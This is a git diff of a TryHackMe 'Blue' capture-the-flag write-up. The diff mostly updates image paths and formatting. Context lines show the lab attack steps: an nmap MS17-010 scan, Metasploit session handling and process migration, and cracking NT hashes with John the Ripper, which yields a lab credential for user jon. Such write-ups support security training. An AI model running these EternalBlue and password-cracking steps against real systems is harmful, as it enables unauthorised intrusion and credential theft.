@@ -1,20 +1,20 @@
 # Blue
 
-![tryhackme.com - © TryHackMe](.gitbook/assets/tryhackme-logo-small.png)
+![tryhackme.com - © TryHackMe](<../../../../../.gitbook/assets/tryhackme-logo-small (2).png>)
 
----
+***
 
 ## Intro
 
-| Room Info           | ![](.gitbook/assets/blue.jpg)           |
-| :------------------ | --------------------------------------- |
-| 🔗 Name              | [Blue](https://tryhackme.com/room/blue) |
-| 🎯 Target IP         | `10.10.177.175`                         |
-| 📈 Difficulty level  | 🟢Easy                                   |
-| 💲 Subscription type | Free                                    |
-| 🪟 OS                | Windows                                 |
+| Room Info            | ![](../../../../../.gitbook/assets/ezgif-2-016707f505.jpg) |
+| -------------------- | ---------------------------------------------------------- |
+| 🔗 Name              | [Blue](https://tryhackme.com/room/blue)                    |
+| 🎯 Target IP         | `10.10.177.175`                                            |
+| 📈 Difficulty level  | 🟢Easy                                                     |
+| 💲 Subscription type | Free                                                       |
+| 🪟 OS                | Windows                                                    |
 
----
+***
 
 ## Recon
 
@@ -24,7 +24,7 @@ nmap -sV -p445 10.10.177.175
 nmap --script smb-vuln-ms17-010 -p445 10.10.177.175
 ```
 
----
+***
 
 ## Exploitation
 
@@ -44,9 +44,9 @@ run
 background # or CTRL+Z
 ```
 
-![](.gitbook/assets/image-20230316134157848.png)
+![](../../../../../.gitbook/assets/image-20230316134157848.png)
 
----
+***
 
 ## Privilege Escalation
 
@@ -60,7 +60,7 @@ set SESSION 2
 run
 ```
 
-![](.gitbook/assets/image-20230316141128868.png)
+![](../../../../../.gitbook/assets/image-20230316141128868.png)
 
 ```bash
 sessions 5
@@ -75,9 +75,9 @@ ps
 migrate 1284
 ```
 
-![](.gitbook/assets/image-20230316141809336.png)
+![](../../../../../.gitbook/assets/image-20230316141809336.png)
 
----
+***
 
 ## Post Exploitation
 
@@ -105,7 +105,7 @@ john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt jonhash.txt
 
 Jon's credentials are `jon`:`alqfna22`.
 
-![](.gitbook/assets/image-20230316142843628.png)
+![](../../../../../.gitbook/assets/image-20230316142843628.png)
 
 ## Flags
 
@@ -118,7 +118,7 @@ cat flag1.txt
 flag{*******************
 ```
 
-![](.gitbook/assets/2024-10-20_22-09-30_758.png)
+![](../../../../../.gitbook/assets/2024-10-20_22-09-30_758.png)
 
 ```bash
 cd C:/Windows/System32/config
@@ -126,7 +126,7 @@ cat flag2.txt
 flag{*****************************
 ```
 
-![](.gitbook/assets/2024-10-20_22-11-22_759.png)
+![](../../../../../.gitbook/assets/2024-10-20_22-11-22_759.png)
 
 ```bash
 cd C:\\Users\\
@@ -137,7 +137,6 @@ cat flag3.txt
 flag{********************************
 ```
 
-![](.gitbook/assets/2024-10-20_22-12-04_760.png)
-
+![](../../../../../.gitbook/assets/2024-10-20_22-12-04_760.png)
 
 ***
